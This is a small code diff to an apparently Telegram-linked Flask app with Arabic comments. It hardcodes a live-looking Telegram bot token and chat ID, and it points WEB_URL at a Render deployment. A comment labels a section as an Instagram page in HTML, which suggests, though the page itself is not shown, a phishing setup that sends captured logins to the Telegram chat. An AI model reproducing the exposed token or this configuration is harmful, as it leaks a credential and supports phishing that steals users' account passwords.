@@ -12,7 +12,7 @@ app = Flask(__name__)
 BOT_TOKEN = "8664732759:AAEdqmFKSYqgd8DpIU7JlCrpsu7TRAIAHcw"
 CHAT_ID = "6691718718"
 # بعد ما ترفع الكود، رح تحط رابط الموقع هون (مثلاً: https://shado-bot.onrender.com)
-WEB_URL = "https://your-app-name.onrender.com" 
+WEB_URL = "https://shado-bot.onrender.com"
 
 # --- الجزء الأول: صفحة الإنستجرام (HTML) ---
 HTML_PAGE = """
